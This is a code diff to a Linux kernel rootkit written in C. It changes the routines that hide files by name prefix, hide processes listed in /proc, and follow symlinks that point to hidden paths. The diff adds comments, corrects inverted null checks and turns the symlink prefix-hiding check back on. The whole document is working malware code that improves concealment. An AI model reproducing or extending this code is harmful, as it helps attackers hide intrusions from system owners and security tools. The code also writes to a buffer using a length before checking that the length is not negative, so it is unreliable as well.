@@ -22,24 +22,36 @@ static int getdents_call_counter = 0;
 static spinlock_t getdents_lock;
 static unsigned long getdents_lock_flags;
 
-
+/*
+ * this function iterates through the path.
+ * useful to check each (folder)name if it matches.
+ */
 char *
 get_next_level (char *path)
 {
 	char *ptr;
 	char delimiter = '/';
 	
+	/* safety check */
 	if(path == NULL) {
 		return NULL;
 	}
 	
+	/* get the next occurence of '/' */
 	ptr = strchr(path, delimiter);
-	if(ptr != NULL) {
+	
+	/* safety check */
+	if(ptr == NULL) {
 		return NULL;
 	} else {
+		/*
+		 * if it is not the last character
+		 * return the remainder
+		 */
 		if(strlen(ptr) > 1) {
 			return ptr + 1;
 		} else {
+			/* else return NULL */
 			return NULL;
 		}
 	}
@@ -73,11 +85,11 @@ check_hide_fprefix(char *path)
 		return 0;
 	}
 
-	do {	
+	do {
 		d_name = get_next_level(path);
 		
 		if(d_name == NULL) {
-			break;
+			return 0;
 		}
 
 		// TODO: implement dynamic prefixes
@@ -90,8 +102,6 @@ check_hide_fprefix(char *path)
 			return 1;
 		}
 	} while (d_name != NULL);
-
-	return 0;
 }
 
 /* 
@@ -104,17 +114,23 @@ check_hide_process(int fd, char *d_name)
 	int ret;
 	char dir[128];
 
+	/* use our function to get the path of the folder */
 	ret = get_path(fd, dir, 128);
+	
+	/* safety check */
 	if(ret <= 0) {
 		ROOTKIT_DEBUG("Something probably went wrong in check_hide_process().\n");
 		return 0;
 	}
 	
+	/* safety check */
 	if(dir == NULL) {
 		return 0;
 	}
 	
+	/* check if we are in the /proc directory */
 	if(strcmp(dir, "/proc") == 0) {
+		/* check if we need to hide this process */
 		return is_process_hidden(convert_atoi(d_name));
 	}
 
@@ -139,6 +155,8 @@ check_hide_symlink(char *path)
 	
 		/* execute our readlinkat syscall */
 		lpath_len = (*syscall_readlink) (curpath, lpath, 1023);
+		
+		/* zero-terminate the string */
 		memset(lpath+lpath_len+1, '\0', 1);
 			
 		/* reset the kernel */
@@ -146,26 +164,24 @@ check_hide_symlink(char *path)
 
 		/* needed because the other functions apparently can't handle it */		
 		if(lpath_len < 0) {
-			break;
+			return 0;
 		}
-		// ROOTKIT_DEBUG("Current lpath: '%s'\n", lpath);
+		
 		/* check if the current link is pointing to a hidden path */
 		if(check_hide_fpath(lpath)) {
 			return 1;
 		}
 
 		/* check if the current link is pointing to a file with a hiding prefix */
-		//if(check_hide_fprefix(lpath)) {
-		//	return 1;
-		//}
+		if(check_hide_fprefix(lpath)) {
+			return 1;
+		}
 
 		/* prepare everything for the next loop */
 		memset(curpath, 0, 1024);
 		strncpy(curpath, lpath, 1024);
 
 	} while (lpath_len > 0);
-
-	return 0;
 }
 
 /*
